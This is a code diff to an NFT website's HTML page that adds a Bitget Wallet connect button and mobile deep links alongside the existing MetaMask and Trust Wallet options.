@@ -158,6 +158,7 @@
   <div class="btn-group">
     <button class="btn-wallet" onclick="connectWallet('MetaMask')">🦊 MetaMask</button>
     <button class="btn-wallet" onclick="connectWallet('Trust Wallet')">📱 Trust</button>
+    <button class="btn-wallet" onclick="connectWallet('Bitget Wallet')">🟠 Bitget</button>
     <button class="btn-wallet" onclick="connectWallet('Coinbase Wallet')">🟣 Coinbase</button>
     <button class="btn-wallet" onclick="connectWallet('Other')">🔗 Other</button>
   </div>
@@ -179,15 +180,16 @@
     <span style="color:#888; font-size:11px;">This site is safe and does not request any permissions.</span>
   </div>
 
-  <!-- MOBİL UYARI (Trust Wallet FIX) -->
+  <!-- MOBİL UYARI (Trust Wallet + Bitget) -->
   <div id="mobileWarning" class="mobile-warning hidden">
     <strong>📱 Mobile wallet connection:</strong><br>
-    Please open this site in the <strong>MetaMask</strong> or <strong>Trust Wallet</strong> in-app browser.<br>
+    Please open this site in the <strong>MetaMask</strong>, <strong>Trust Wallet</strong>, or <strong>Bitget Wallet</strong> in-app browser.<br>
     <br>
     <a href="https://metamask.app.link/dapp/ghostprotocolnft.onrender.com" target="_blank">🦊 Open with MetaMask</a><br>
     <a href="https://link.trustwallet.com/open?url=https://ghostprotocolnft.onrender.com" target="_blank">📱 Open with Trust Wallet</a><br>
+    <a href="https://web3.bitget.com/en/wallet?action=open&url=https://ghostprotocolnft.onrender.com" target="_blank">🟠 Open with Bitget Wallet</a><br>
     <br>
-    <span style="color:#888; font-size:11px;">If the button above doesn't work, copy this link and paste it into Trust Wallet's browser:</span><br>
+    <span style="color:#888; font-size:11px;">If the button above doesn't work, copy this link and paste it into your wallet's browser:</span><br>
     <span class="copy-link">https://ghostprotocolnft.onrender.com</span>
   </div>
 
@@ -207,13 +209,19 @@
   async function connectWallet(type) {
     // TRUST WALLET ÖZEL KONTROL
     if (type === 'Trust Wallet' && isMobile) {
-      // Trust Wallet deep link'i dene
-      const trustUrl = 'https://link.trustwallet.com/open?url=https://ghostprotocolnft.onrender.com';
-      window.location.href = trustUrl;
-      // Eğer deep link çalışmazsa, 2 saniye sonra uyarıyı göster
+      window.location.href = 'https://link.trustwallet.com/open?url=https://ghostprotocolnft.onrender.com';
       setTimeout(() => {
         document.getElementById('mobileWarning').classList.remove('hidden');
-      }, 2000);
+      }, 3000);
+      return;
+    }
+
+    // BITGET WALLET ÖZEL KONTROL
+    if (type === 'Bitget Wallet' && isMobile) {
+      window.location.href = 'https://web3.bitget.com/en/wallet?action=open&url=https://ghostprotocolnft.onrender.com';
+      setTimeout(() => {
+        document.getElementById('mobileWarning').classList.remove('hidden');
+      }, 3000);
       return;
     }
 
@@ -247,7 +255,7 @@
       if (isMobile) {
         document.getElementById('mobileWarning').classList.remove('hidden');
       } else {
-        alert('❌ No Web3 wallet found.\nPlease install MetaMask, Trust Wallet, or any Web3 wallet.');
+        alert('❌ No Web3 wallet found.\nPlease install MetaMask, Trust Wallet, Bitget Wallet, or any Web3 wallet.');
       }
     }
   }
